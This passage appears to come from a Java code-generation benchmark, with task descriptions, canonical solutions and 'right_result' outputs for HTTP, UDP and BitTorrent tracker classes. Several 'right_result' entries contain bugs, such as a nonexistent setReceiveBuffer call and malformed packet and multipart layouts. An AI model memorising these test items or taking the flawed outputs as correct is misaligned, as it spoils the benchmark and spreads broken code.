    "right_result": "import java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private String delimiter;\n    private String boundary;\n\n    public HttpClient(String url) {\n        this.url = url;\n        this.delimiter = \"--\";\n        this.boundary = generateBoundary();\n    }\n\n    private String generateBoundary() {\n        return \"boundary_\" + System.currentTimeMillis();\n    }\n\n    public void connectForMultipart() throws IOException {\n        con = (HttpURLConnection) new URL(url).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        os = con.getOutputStream();\n    }\n\n    private void writeParamData(String paramName, String value) throws IOException {\n        os.write((boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"Content-Type: text/plain; charset=UTF-8\\r\\n\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n\n    public void addFormPart(String paramName, String value) throws IOException {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws IOException {\n        os.write((boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"Content-Type: application/octet-stream\\r\\n\\r\\n\".getBytes());\n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws IOException {\n        os.close();\n        con.disconnect();\n    }\n\n    public String getResponse() throws IOException {\n        try (InputStream is = con.getInputStream()) {\n            byte[] buffer = new byte[1024];\n            StringBuilder response = new StringBuilder();\n            int n;\n            while ((n = is.read(buffer)) != -1) {\n                response.append(new String(buffer, 0, n));\n            }\n            return response.toString();\n        } catch (IOException e) {\n            throw e;\n        }\n    }\n\n    public byte[] downloadImage(String imgName) throws IOException {\n        HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setDoOutput(true);\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n\n        try (OutputStream os = con.getOutputStream()) {\n            String formData = \"imgName=\" + URLEncoder.encode(imgName, \"UTF-8\");\n            os.write(formData.getBytes(StandardCharsets.UTF_8));\n        }\n\n        try (InputStream is = con.getInputStream()) {\n            byte[] imageData = new byte[is.available()];\n            is.read(imageData);\n            return imageData;\n        }\n    }\n}"
  },
  {
    "Task_id": 601,
    "Instruction": "Task Description: Create a Java class that implements UDP communication functionality for sending and receiving packets, with configurable buffer size and port management.\n\nClass Description: The SnmpUdpHandler class provides UDP network communication capabilities for both sending and receiving datagram packets. It encapsulates the Java DatagramSocket functionality with additional convenience methods for packet handling and resource management.\n\nAttributes:\n- socket: DatagramSocket - The underlying UDP socket used for communication\n- bufferSize: int - The size of the buffer used for receiving packets (default 1024)\n- address: InetAddress - The IP address the socket is bound to\n- port: int - The port number the socket is bound to\n\nMethods:\n- SnmpUdpHandler(int port, InetAddress address) -> void - Constructor that initializes the UDP socket bound to the specified port and address\n- sendPacket(byte[] data, InetAddress destination, int destPort) -> void - Sends a UDP packet containing the specified data to the given destination address and port\n- receivePacket() -> byte[] - Receives a UDP packet and returns its data as a byte array\n- close() -> void - Closes the UDP socket and releases system resources\n- getPort() -> int - Returns the local port number the socket is bound to\n- setBufferSize(int size) -> void - Sets the buffer size used for receiving packets",
    "Canonical_solution": "import java.net.DatagramSocket;\nimport java.net.DatagramPacket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.io.IOException;\n\npublic class SnmpUdpHandler {\n\n    private DatagramSocket socket;\n    private int bufferSize = 1024;\n    private InetAddress address;\n    private int port;\n\n    public SnmpUdpHandler(int port, InetAddress address) throws SocketException {\n        this.port = port;\n        this.address = address;\n        this.socket = new DatagramSocket(port, address);\n    }\n\n    public void sendPacket(byte[] data, InetAddress destination, int destPort) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, data.length, destination, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        byte[] buffer = new byte[bufferSize];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return packet.getData();\n    }\n\n    public void close() {\n        if (socket != null) {\n            socket.close();\n        }\n    }\n\n    public int getPort() {\n        return socket != null ? socket.getLocalPort() : port;\n    }\n\n    public void setBufferSize(int size) {\n        this.bufferSize = size;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.*;\nimport java.io.*;\nimport java.util.Arrays;\n\npublic class SnmpUdpHandler {\n    private DatagramSocket socket;\n    private int bufferSize = 1024;\n    private InetAddress address;\n    private int port;\n\n    public SnmpUdpHandler(int port, InetAddress address) throws SocketException {\n        this.socket = new DatagramSocket(port, address);\n        this.bufferSize = 1024;\n        socket.setReceiveBuffer(bufferSize);\n        this.port = port;\n        this.address = address;\n    }\n\n    public void sendPacket(byte[] data, InetAddress destination, int destPort) throws IOException {\n        DatagramPacket packet = new DatagramPacket(data, data.length, destination, destPort);\n        socket.send(packet);\n    }\n\n    public byte[] receivePacket() throws IOException {\n        byte[] buffer = new byte[bufferSize];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.receive(packet);\n        return Arrays.copyOf(buffer, packet.getLength());\n    }\n\n    public void close() throws IOException {\n        socket.close();\n    }\n\n    public int getPort() {\n        return socket.getLocalPort();\n    }\n\n    public void setBufferSize(int size) {\n        this.bufferSize = size;\n        socket.setReceiveBuffer(bufferSize);\n    }\n}"
  },
  {
    "Task_id": 605,
    "Instruction": "Task Description: Implement a UDP-based tracker server that handles client connections and announcements for a peer-to-peer network, managing connection IDs and responding to client requests with appropriate status information.\n\nClass Description: SingleClientUdpTracker is a UDP server implementation that simulates a BitTorrent tracker, handling client connect and announce requests while maintaining connection state and expiration.\n\nAttributes:\n- CONNECTION_EXPIRATION_TIME: [Duration] - Maximum duration before a connection expires\n- EPHEMERAL_CONNECTION_ID: [long] - Magic number used for initial connection requests\n- CONNECT_CODE: [int] - Action code for connection requests\n- ANNOUNCE_CODE: [int] - Action code for announce requests\n- ERROR_CODE: [int] - Action code for error responses\n- serverSocket: [DatagramSocket] - UDP socket for communication\n- interval: [int] - Announce interval to send to clients\n- leechers: [int] - Number of leechers to report\n- seeders: [int] - Number of seeders to report\n- shutdown: [boolean] - Flag to control server shutdown\n- currentConnection: [long] - Current active connection ID\n- connectedOn: [long] - Timestamp of when current connection was established\n\nMethods:\n- SingleClientUdpTracker([int interval, int leechers, int seeders]) -> [void] - Constructor that initializes the UDP socket with random port and sets tracker parameters\n- getServerAddress() -> [SocketAddress] - Returns the local socket address of the server\n- run() -> [void] - Main server loop that receives requests and sends responses\n- processRequest([byte[] requestData]) -> [byte[]] - Processes incoming UDP packets and generates appropriate responses\n- generateConnectionId() -> [long] - Generates a new random connection ID\n- createConnectResponse([long connectionId, int transactionId]) -> [byte[]] - Creates a connect response packet\n- createAnnounceResponse([long connectionId, int transactionId]) -> [byte[]] - Creates an announce response packet\n- createError([int transactionId, String message]) -> [byte[]] - Creates an error response packet\n- shutdown() -> [void] - Shuts down the server and closes the socket",
    "Canonical_solution": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.Inet4Address;\nimport java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.net.SocketException;\nimport java.nio.charset.StandardCharsets;\nimport java.time.Duration;\nimport java.util.Arrays;\nimport java.util.Random;\n\npublic class SingleClientUdpTracker {\n\n    private static final Duration CONNECTION_EXPIRATION_TIME = Duration.ofMinutes(2);\n    private static final long EPHEMERAL_CONNECTION_ID = 0x41727101980L;\n\n    private static final int CONNECT_CODE = 0;\n    private static final int ANNOUNCE_CODE = 1;\n    private static final int ERROR_CODE = 3;\n\n    private final DatagramSocket serverSocket;\n    private final int interval;\n    private final int leechers;\n    private final int seeders;\n\n    private volatile boolean shutdown;\n    private volatile long currentConnection;\n    private volatile long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) throws SocketException {\n        this.serverSocket = new DatagramSocket(new InetSocketAddress(Inet4Address.getLoopbackAddress(), 0));\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n    }\n\n    public SocketAddress getServerAddress() {\n        return serverSocket.getLocalSocketAddress();\n    }\n\n    public void run() {\n        byte[] rbuf = new byte[8192];\n        DatagramPacket received = new DatagramPacket(rbuf, rbuf.length);\n        try {\n            serverSocket.receive(received);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n\n        byte[] response = processRequest(Arrays.copyOfRange(rbuf, 0, received.getLength()));\n        DatagramPacket sent = new DatagramPacket(response, response.length, received.getSocketAddress());\n        try {\n            serverSocket.send(sent);\n        } catch (IOException e) {\n            throw new RuntimeException(\"Unexpected I/O error\", e);\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        long connectionId = Protocols.readLong(requestData, 0);\n        int action = Protocols.readInt(requestData, 8);\n        int transactionId = Protocols.readInt(requestData, 12);\n        boolean connectionExpired = System.currentTimeMillis() - connectedOn > CONNECTION_EXPIRATION_TIME.toMillis();\n\n        switch (action) {\n            case CONNECT_CODE: {\n                if (connectionId != EPHEMERAL_CONNECTION_ID) {\n                    return createError(transactionId,\n                            \"Connect request should use \" + EPHEMERAL_CONNECTION_ID + \" as connection ID\");\n                } else if (!connectionExpired) {\n                    return createError(transactionId, \"Connection is not expired yet: \" + connectionId);\n                }\n                currentConnection = generateConnectionId();\n                connectedOn = System.currentTimeMillis();\n                return createConnectResponse(currentConnection, transactionId);\n            }\n            case ANNOUNCE_CODE: {\n                if (currentConnection != connectionId) {\n                    return createError(transactionId, \"Unknown connection: \" + connectionId);\n                } else if (connectionExpired) {\n                    return createError(transactionId, \"Connection expired: \" + connectionId);\n                }\n                return createAnnounceResponse(currentConnection, transactionId);\n            }\n            default: {\n                return createError(transactionId, \"Unsupported action: \" + action);\n            }\n        }\n    }\n\n    private long generateConnectionId() {\n        return new Random(System.currentTimeMillis()).nextLong();\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 8];\n        System.arraycopy(Protocols.getIntBytes(CONNECT_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getLongBytes(connectionId), 0, data, 8, 8);\n        return data;\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        byte[] data = new byte[4 + 4 + 4 + 4 + 4];\n        System.arraycopy(Protocols.getIntBytes(ANNOUNCE_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(Protocols.getIntBytes(interval), 0, data, 8, 4);\n        System.arraycopy(Protocols.getIntBytes(leechers), 0, data, 12, 4);\n        System.arraycopy(Protocols.getIntBytes(seeders), 0, data, 16, 4);\n        return data;\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        byte[] messageBytes = message.getBytes(StandardCharsets.US_ASCII);\n        byte[] data = new byte[4 + 4 + messageBytes.length];\n        System.arraycopy(Protocols.getIntBytes(ERROR_CODE), 0, data, 0, 4);\n        System.arraycopy(Protocols.getIntBytes(transactionId), 0, data, 4, 4);\n        System.arraycopy(messageBytes, 0, data, 8, messageBytes.length);\n        return data;\n    }\n\n    public void shutdown() {\n        this.shutdown = true;\n        this.serverSocket.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "```java\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketAddress;\nimport java.util.Random;\n\npublic class SingleClientUdpTracker {\n    private static final long EPHEMERAL_CONNECTION_ID = 0x123456789ABCDEF0L;\n    private static final int CONNECT_CODE = 1;\n    private static final int ANNOUNCE_CODE = 2;\n    private static final int ERROR_CODE = 3;\n    private static final long CONNECTION_EXPIRATION_TIME = 30 * 60 * 1000; // 30 minutes\n\n    private DatagramSocket serverSocket;\n    private int interval;\n    private int leechers;\n    private int seeders;\n    private boolean shutdown;\n    private long currentConnection;\n    private long connectedOn;\n\n    public SingleClientUdpTracker(int interval, int leechers, int seeders) {\n        this.interval = interval;\n        this.leechers = leechers;\n        this.seeders = seeders;\n        try {\n            serverSocket = new DatagramSocket();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public SocketAddress getServerAddress() {\n        return serverSocket.getLocalSocketAddress();\n    }\n\n    public void run() {\n        while (!shutdown) {\n            try {\n                byte[] buffer = new byte[1024];\n                DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n                serverSocket.receive(packet);\n                byte[] requestData = packet.getData();\n                byte[] response = processRequest(requestData);\n                DatagramPacket responsePacket = new DatagramPacket(response, response.length, packet.getAddress(), packet.getPort());\n                serverSocket.send(responsePacket);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private byte[] processRequest(byte[] requestData) {\n        int actionCode = (requestData[0] & 0xFF) << 8 | (requestData[1] & 0xFF);\n        int transactionId = (requestData[2] & 0xFF) << 24 | (requestData[3] & 0xFF) << 16 | (requestData[4] & 0xFF) << 8 | (requestData[5] & 0xFF);\n\n        if (actionCode == CONNECT_CODE) {\n            long connectionId = EPHEMERAL_CONNECTION_ID;\n            currentConnection = connectionId;\n            connectedOn = System.currentTimeMillis();\n            return createConnectResponse(connectionId, transactionId);\n        } else if (actionCode == ANNOUNCE_CODE) {\n            long currentTime = System.currentTimeMillis();\n            if (currentTime - connectedOn > CONNECTION_EXPIRATION_TIME) {\n                return createError(transactionId, \"Connection expired\");\n            }\n            return createAnnounceResponse(currentConnection, transactionId);\n        } else {\n            return createError(transactionId, \"Unknown action code\");\n        }\n    }\n\n    private long generateConnectionId() {\n        return new Random().nextLong();\n    }\n\n    private byte[] createConnectResponse(long connectionId, int transactionId) {\n        byte[] response = new byte[12];\n        response[0] = (byte) (CONNECT_CODE & 0xFF);\n        response[1] = (byte) ((CONNECT_CODE >> 8) & 0xFF);\n        response[2] = (byte) (transactionId & 0xFF);\n        response[3] = (byte) ((transactionId >> 8) & 0xFF);\n        response[4] = (byte) ((transactionId >> 16) & 0xFF);\n        response[5] = (byte) ((transactionId >> 24) & 0xFF);\n        for (int i = 0; i < 8; i++) {\n            response[6 + i] = (byte) ((connectionId >> (i * 8)) & 0xFF);\n        }\n        return response;\n    }\n\n    private byte[] createAnnounceResponse(long connectionId, int transactionId) {\n        byte[] response = new byte[12];\n        response[0] = (byte) (ANNOUNCE_CODE & 0xFF);\n        response[1] = (byte) ((ANNOUNCE_CODE >> 8) & 0xFF);\n        response[2] = (byte) (transactionId & 0xFF);\n        response[3] = (byte) ((transactionId >> 8) & 0xFF);\n        response[4] = (byte) ((transactionId >> 16) & 0xFF);\n        response[5] = (byte) ((transactionId >> 24) & 0xFF);\n        response[6] = (byte) (leechers & 0xFF);\n        response[7] = (byte) ((leechers >> 8) & 0xFF);\n        response[8] = (byte) (seeders & 0xFF);\n        response[9] = (byte) ((seeders >> 8) & 0xFF);\n        return response;\n    }\n\n    private byte[] createError(int transactionId, String message) {\n        byte[] response = new byte[10 + message.length()];\n        response[0] = (byte) (ERROR_CODE & 0xFF);\n        response[1] = (byte) ((ERROR_CODE >> 8) & 0xFF);\n        response[2] = (byte) (transactionId & 0xFF);\n        response[3] = (byte) ((transactionId >> 8) & 0xFF);\n        response[4] = (byte) ((transactionId >> 16) & 0xFF);\n        response[5] = (byte) ((transactionId >> 24) & 0xFF);\n        for (int i = 0; i < message.length(); i++) {\n            response[6 + i] = (byte) message.charAt(i);\n        }\n        return response;\n    }\n\n    public void shutdown() {\n        shutdown = true;\n        try {\n            serverSocket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 608,
    "Instruction": "Task Description: Implement a UDP-based client class for network communication that can send and receive datagram packets, manage connections, and handle timeouts.\n\nClass Description: ConnectDatagram is a UDP client class that extends a base Connection class. It provides functionality for sending and receiving XDR-encoded data over UDP, managing socket connections, and handling peer address information.\n\nAttributes:\n- ds: DatagramSocket - The UDP socket used for communication\n- dp: DatagramPacket - The packet used for receiving data\n- addr: InetAddress - The IP address of the server/peer\n\nMethods:\n- ConnectDatagram(String server, int port, int maxSize) -> void - Constructor that initializes the UDP connection with server address, port, and maximum packet size\n- sendOne(Xdr x) -> void - Sends an XDR-encoded packet to the server\n- receiveOne(Xdr x, int timeout) -> void - Receives an XDR-encoded packet with a specified timeout\n- getPeer() -> InetAddress - Returns the address of the peer that sent the last received packet\n- dropConnection() -> void - Placeholder for connection cleanup (UDP is connectionless)\n- checkConnection() -> void - Placeholder for connection verification (UDP is connectionless)\n- finalize() -> void - Cleans up resources by closing the socket when the object is garbage collected",
    "Canonical_solution": "import java.io.*;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ConnectDatagram extends Connection {\n\n    DatagramSocket ds;\n    DatagramPacket dp;\n    InetAddress addr;\n\n    public ConnectDatagram(String server, int port, int maxSize) throws IOException {\n        super(server, port, \"udp\", maxSize);\n        ds = new DatagramSocket();\n        addr = InetAddress.getByName(server);\n        start();\n    }\n\n    void sendOne(Xdr x) throws IOException {\n        ds.send(new DatagramPacket(x.xdr_buf(), x.xdr_offset(), addr, port));\n    }\n\n    void receiveOne(Xdr x, int timeout) throws IOException {\n        ds.setSoTimeout(timeout);\n        dp = new DatagramPacket(x.xdr_buf(), x.xdr_buf().length);\n        ds.receive(dp);\n    }\n\n    InetAddress getPeer() {\n        return dp.getAddress();\n    }\n\n    void dropConnection() {\n    }\n\n    void checkConnection() {\n    }\n\n    protected void finalize() throws Throwable {\n        if (ds != null) {\n            ds.close();\n            ds = null;\n        }\n        super.finalize();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.*;\nimport java.io.*;\n\npublic class ConnectDatagram extends Connection {\n    private DatagramSocket ds;\n    private DatagramPacket dp;\n    private InetAddress addr;\n\n    public ConnectDatagram(String server, int port, int maxSize) {\n        try {\n            addr = InetAddress.getByName(server);\n            ds = new DatagramSocket();\n            dp = new DatagramPacket(new byte[maxSize], maxSize, addr, port);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendOne(Xdr x) {\n        try {\n            byte[] data = x.encode();\n            dp.setData(data);\n            dp.setSocketAddress(new InetSocketAddress(addr, port));\n            ds.send(dp);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void receiveOne(Xdr x, int timeout) {\n        try {\n            ds.setSoTimeout(timeout);\n            ds.receive(dp);\n            x.decode(dp.getData());\n            this.addr = dp.getAddress();\n        } catch (SocketTimeoutException e) {\n            // Timeout occurred\n        } catch (IOException e) {\n            // Handle other IO exceptions\n        }\n    }\n\n    public InetAddress getPeer() {\n        return dp.getAddress();\n    }\n\n    public void dropConnection() {\n        if (ds != null) {\n            try {\n                ds.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void checkConnection() {\n        // Placeholder for connection verification\n    }\n\n    protected void finalize() {\n        try {\n            if (ds != null) {\n                ds.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 610,
    "Instruction": "Task Description: Implement a UDP-based tracker client for peer-to-peer file sharing systems that can connect to a tracker server, maintain connection state, and handle announce requests and responses.\n\nClass Description: UDPTrackerClient is a specialized tracker client that communicates with BitTorrent trackers using UDP protocol. It handles connection establishment, announcement of peer information, and manages timeouts and retries for reliable communication.\n\nAttributes:\n- logger: Logger - Logger instance for tracking client activities\n- UDP_BASE_TIMEOUT_SECONDS: int - Base timeout value for UDP communication\n- UDP_MAX_TRIES: int - Maximum number of retry attempts\n- UDP_MAX_TRIES_ON_STOPPED: int - Maximum retries for STOPPED events\n- UDP_PACKET_LENGTH: int - Maximum UDP packet size\n- address: InetSocketAddress - Tracker server address\n- random: Random - Random number generator for transaction IDs\n- socket: DatagramSocket - UDP communication socket\n- connectionExpiration: Date - When the current connection expires\n- connectionId: long - Current connection identifier\n- transactionId: int - Current transaction identifier\n- stop: boolean - Flag to indicate if client should stop operations\n\nMethods:\n- UDPTrackerClient(List<Peer> peers, URI tracker) -> void - Constructor that initializes the client with peer list and tracker URI\n- announce(AnnounceRequestMessage.RequestEvent event, boolean inhibitEvents, AnnounceableInformation torrent, List<Peer> peers) -> void - Main method to announce peer information to tracker\n- handleTrackerAnnounceResponse(TrackerMessage message, boolean inhibitEvents, String hexInfoHash) -> void - Processes announce responses from tracker\n- close() -> void - Closes the client and releases resources\n- buildAnnounceRequest(AnnounceRequestMessage.RequestEvent event, AnnounceableInformation torrent, Peer peer) -> UDPAnnounceRequestMessage - Constructs announce request message\n- validateTrackerResponse(TrackerMessage message) -> void - Validates tracker response messages\n- handleTrackerConnectResponse(TrackerMessage message) -> void - Processes connection responses from tracker\n- send(ByteBuffer data) -> void - Sends data to tracker server\n- recv(int attempt) -> ByteBuffer - Receives data from tracker server with timeout handling",
    "Canonical_solution": "import com.turn.ttorrent.common.AnnounceableInformation;\nimport com.turn.ttorrent.common.Peer;\nimport com.turn.ttorrent.common.TorrentLoggerFactory;\nimport com.turn.ttorrent.common.protocol.AnnounceRequestMessage;\nimport com.turn.ttorrent.common.protocol.TrackerMessage;\nimport com.turn.ttorrent.common.protocol.TrackerMessage.ErrorMessage;\nimport com.turn.ttorrent.common.protocol.TrackerMessage.MessageValidationException;\nimport com.turn.ttorrent.common.protocol.udp.UDPAnnounceRequestMessage;\nimport com.turn.ttorrent.common.protocol.udp.UDPConnectRequestMessage;\nimport com.turn.ttorrent.common.protocol.udp.UDPConnectResponseMessage;\nimport com.turn.ttorrent.common.protocol.udp.UDPTrackerMessage;\nimport org.slf4j.Logger;\n\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.UnsupportedAddressTypeException;\nimport java.util.Calendar;\nimport java.util.Date;\nimport java.util.List;\nimport java.util.Random;\n\npublic class UDPTrackerClient extends TrackerClient {\n\n  protected static final Logger logger =\n          TorrentLoggerFactory.getLogger(UDPTrackerClient.class);\n\n  private static final int UDP_BASE_TIMEOUT_SECONDS = 15;\n  private static final int UDP_MAX_TRIES = 8;\n  private static final int UDP_MAX_TRIES_ON_STOPPED = 1;\n  private static final int UDP_PACKET_LENGTH = 512;\n\n  private final InetSocketAddress address;\n  private final Random random;\n\n  private DatagramSocket socket;\n  private Date connectionExpiration;\n  private long connectionId;\n  private int transactionId;\n  private boolean stop;\n\n  public UDPTrackerClient(List<Peer> peers, URI tracker)\n          throws UnknownHostException {\n    super(peers, tracker);\n\n    for (Peer peer : peers) {\n      if (!(InetAddress.getByName(peer.getIp()) instanceof Inet4Address)) {\n        throw new UnsupportedAddressTypeException();\n      }\n    }\n\n    this.address = new InetSocketAddress(\n            tracker.getHost(),\n            tracker.getPort());\n\n    this.socket = null;\n    this.random = new Random();\n    this.connectionExpiration = null;\n    this.stop = false;\n  }\n\n  @Override\n  public void announce(final AnnounceRequestMessage.RequestEvent event,\n                       boolean inhibitEvents, final AnnounceableInformation torrent, final List<Peer> peers) throws AnnounceException {\n    int maxAttempts = AnnounceRequestMessage.RequestEvent\n            .STOPPED.equals(event)\n            ? UDP_MAX_TRIES_ON_STOPPED\n            : UDP_MAX_TRIES;\n    int attempts = -1;\n\n    try {\n      this.socket = new DatagramSocket();\n      this.socket.connect(this.address);\n\n      while (++attempts <= maxAttempts) {\n        this.transactionId = this.random.nextInt();\n\n        if (this.connectionExpiration != null) {\n          if (new Date().before(this.connectionExpiration)) {\n            for (Peer peer : peers) {\n              this.send(this.buildAnnounceRequest(event, torrent, peer).getData());\n            }\n\n            try {\n              this.handleTrackerAnnounceResponse(\n                      UDPTrackerMessage.UDPTrackerResponseMessage\n                              .parse(this.recv(attempts)), inhibitEvents, torrent.getHexInfoHash());\n              return;\n            } catch (SocketTimeoutException ste) {\n              if (stop) {\n                return;\n              }\n            }\n          }\n        }\n\n        this.send(UDPConnectRequestMessage\n                .craft(this.transactionId).getData());\n\n        try {\n          this.handleTrackerConnectResponse(\n                  UDPTrackerMessage.UDPTrackerResponseMessage\n                          .parse(this.recv(attempts)));\n          attempts = -1;\n        } catch (SocketTimeoutException ste) {\n          if (stop) {\n            return;\n          }\n        }\n      }\n\n      throw new AnnounceException(\"Timeout while announcing\" +\n              this.formatAnnounceEvent(event) + \" to tracker!\");\n    } catch (IOException ioe) {\n      throw new AnnounceException(\"Error while announcing\" +\n              this.formatAnnounceEvent(event) +\n              \" to tracker: \" + ioe.getMessage(), ioe);\n    } catch (MessageValidationException mve) {\n      throw new AnnounceException(\"Tracker message violates expected \" +\n              \"protocol (\" + mve.getMessage() + \")\", mve);\n    }\n  }\n\n  @Override\n  protected void handleTrackerAnnounceResponse(TrackerMessage message,\n                                               boolean inhibitEvents, String hexInfoHash) throws AnnounceException {\n    this.validateTrackerResponse(message);\n    super.handleTrackerAnnounceResponse(message, inhibitEvents, hexInfoHash);\n  }\n\n  @Override\n  protected void close() {\n    this.stop = true;\n    if (this.socket != null && !this.socket.isClosed()) {\n      this.socket.close();\n    }\n  }\n\n  private UDPAnnounceRequestMessage buildAnnounceRequest(\n          final AnnounceRequestMessage.RequestEvent event, final AnnounceableInformation torrent, final Peer peer) {\n    return UDPAnnounceRequestMessage.craft(\n            this.connectionId,\n            transactionId,\n            torrent.getInfoHash(),\n            peer.getPeerIdArray(),\n            torrent.getDownloaded(),\n            torrent.getUploaded(),\n            torrent.getLeft(),\n            event,\n            peer.getAddress().getAddress(),\n            0,\n            AnnounceRequestMessage.DEFAULT_NUM_WANT,\n            peer.getPort());\n  }\n\n  private void validateTrackerResponse(TrackerMessage message)\n          throws AnnounceException {\n    if (message instanceof ErrorMessage) {\n      throw new AnnounceException(((ErrorMessage) message).getReason());\n    }\n\n    if (message instanceof UDPTrackerMessage &&\n            (((UDPTrackerMessage) message).getTransactionId() != this.transactionId)) {\n      throw new AnnounceException(\"Invalid transaction ID!\");\n    }\n  }\n\n  private void handleTrackerConnectResponse(TrackerMessage message)\n          throws AnnounceException {\n    this.validateTrackerResponse(message);\n\n    if (!(message instanceof ConnectionResponseMessage)) {\n      throw new AnnounceException(\"Unexpected tracker message type \" +\n              message.getType().name() + \"!\");\n    }\n\n    UDPConnectResponseMessage connectResponse =\n            (UDPConnectResponseMessage) message;\n\n    this.connectionId = connectResponse.getConnectionId();\n    Calendar now = Calendar.getInstance();\n    now.add(Calendar.MINUTE, 1);\n    this.connectionExpiration = now.getTime();\n  }\n\n  private void send(ByteBuffer data) {\n    try {\n      this.socket.send(new DatagramPacket(\n              data.array(),\n              data.capacity(),\n              this.address));\n    } catch (IOException ioe) {\n      logger.info(\"Error sending datagram packet to tracker at {}: {}.\", this.address, ioe.getMessage());\n    }\n  }\n\n  private ByteBuffer recv(int attempt)\n          throws IOException, SocketException, SocketTimeoutException {\n    int timeout = UDP_BASE_TIMEOUT_SECONDS * (int) Math.pow(2, attempt);\n    logger.trace(\"Setting receive timeout to {}s for attempt {}...\",\n            timeout, attempt);\n    this.socket.setSoTimeout(timeout * 1000);\n\n    try {\n      DatagramPacket p = new DatagramPacket(\n              new byte[UDP_PACKET_LENGTH],\n              UDP_PACKET_LENGTH);\n      this.socket.receive(p);\n      return ByteBuffer.wrap(p.getData(), 0, p.getLength());\n    } catch (SocketTimeoutException ste) {\n      throw ste;\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 2,
    "right_result": "import java.net.*;\nimport java.util.*;\nimport java.io.*;\nimport java.util.logging.Logger;\n\npublic class UDPTrackerClient {\n    private final Logger logger;\n    private final int UDP_BASE_TIMEOUT_SECONDS = 5;\n    private final int UDP_MAX_TRIES = 3;\n    private final int UDP_MAX_TRIES_ON_STOPPED = 5;\n    private final int UDP_PACKET_LENGTH = 65507;\n    private final InetSocketAddress address;\n    private final Random random;\n    private DatagramSocket socket;\n    private Date connectionExpiration;\n    private long connectionId;\n    private int transactionId;\n    private boolean stop;\n\n    public UDPTrackerClient(List<Peer> peers, URI tracker) {\n        logger = Logger.getLogger(UDPTrackerClient.class.getName());\n        address = new InetSocketAddress(tracker.getHost(), tracker.getPort());\n        random = new Random();\n        socket = new DatagramSocket();\n        connectionExpiration = new Date(System.currentTimeMillis() + 300000); // 5 minutes\n        connectionId = System.currentTimeMillis();\n        transactionId = random.nextInt();\n        stop = false;\n    }\n\n    public void announce(AnnounceRequestMessage.RequestEvent event, boolean inhibitEvents, AnnounceableInformation torrent, List<Peer> peers) {\n        for (int i = 0; i < UDP_MAX_TRIES; i++) {\n            try {\n                UDPAnnounceRequestMessage request = buildAnnounceRequest(event, torrent, peers.get(0));\n                send(request.serialize());\n                ByteBuffer response = recv(i + 1);\n                if (response != null) {\n                    handleTrackerAnnounceResponse(response, inhibitEvents, torrent.getInfoHash());\n                    break;\n                }\n            } catch (Exception e) {\n                logger.severe(\"Failed to announce: \" + e.getMessage());\n            }\n        }\n    }\n\n    private UDPAnnounceRequestMessage buildAnnounceRequest(AnnounceRequestMessage.RequestEvent event, AnnounceableInformation torrent, Peer peer) {\n        UDPAnnounceRequestMessage request = new UDPAnnounceRequestMessage();\n        request.setRequestEvent(event);\n        request.setTorrentInfo(torrent);\n        request.setPeer(peer);\n        request.setTransactionId(transactionId);\n        return 